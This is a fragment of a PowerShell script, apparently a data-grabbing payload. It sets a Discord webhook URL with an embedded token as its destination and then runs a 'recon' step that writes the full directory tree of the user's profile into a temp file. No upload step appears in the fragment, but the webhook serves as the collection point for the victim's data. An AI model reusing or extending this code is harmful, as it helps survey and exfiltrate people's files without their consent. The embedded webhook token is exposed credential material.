...
$dc = "https://discord.com/api/webhooks/1203693234262638632/2NDEB9kqZ1gVO4N2yBr3NWEtAHVA0GvPnd39S5Rd9rqHDe-Trbtk8jwOuuLe01mnSOCr"

############################################################################################################################################################

# Recon all User Directories
Tree $Env:userprofile /a /f >> $env:TEMP\$FolderName\Tree.txt
